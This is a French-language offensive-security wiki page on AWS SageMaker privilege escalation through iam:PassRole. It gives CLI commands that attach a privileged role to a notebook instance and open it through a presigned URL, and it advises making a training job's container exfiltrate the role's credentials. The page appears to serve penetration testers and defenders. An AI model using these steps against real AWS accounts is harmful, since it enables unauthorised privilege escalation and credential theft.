---
title: "SageMaker : PassRole vers un notebook ou un training job"
description: "iam:PassRole vers une instance de notebook SageMaker ou un training job pour exécuter du code sous un rôle SageMaker privilégié."
keywords:
  - PassRole
  - SageMaker
  - notebook
  - training job
  - service role
---

# SageMaker

Les instances de notebook et les training jobs SageMaker s'exécutent sous un **rôle d'exécution** transmis. Avec `iam:PassRole` et `sagemaker:CreateNotebookInstance` (plus `CreatePresignedNotebookInstanceUrl`), vous rattachez un rôle privilégié à un notebook que vous contrôlez et vous ouvrez un terminal Jupyter qui détient les identifiants du rôle.

## Voie du notebook

```bash
aws sagemaker create-notebook-instance --notebook-instance-name x \
  --instance-type ml.t3.medium \
  --role-arn arn:aws:iam::<acct>:role/<privileged-role>
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name x
# open the URL, launch a terminal, then:
#   aws sts get-caller-identity   (runs as the SageMaker role)
```

## Voie du training job

`sagemaker:CreateTrainingJob` exécute un conteneur que vous spécifiez en tant que rôle, sans accès interactif nécessaire : faites en sorte que le point d'entrée du conteneur exfiltre les identifiants du rôle.

## Notes d'exploitation

- L'URL présignée accorde l'accès sans permissions sur la console SageMaker : un appel d'API plus l'URL constituent donc l'ensemble du chemin.
- Les rôles SageMaker disposent fréquemment d'un large accès S3 et ECR pour les jeux de données et les images, ce qui étend le pivot.

## Outils

- **AWS CLI** (`sagemaker create-notebook-instance` / `create-presigned-notebook-instance-url`).
- **Pacu** : module privesc SageMaker.

## Références

- [Rhino Security Labs : élévation de privilèges AWS (SageMaker)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
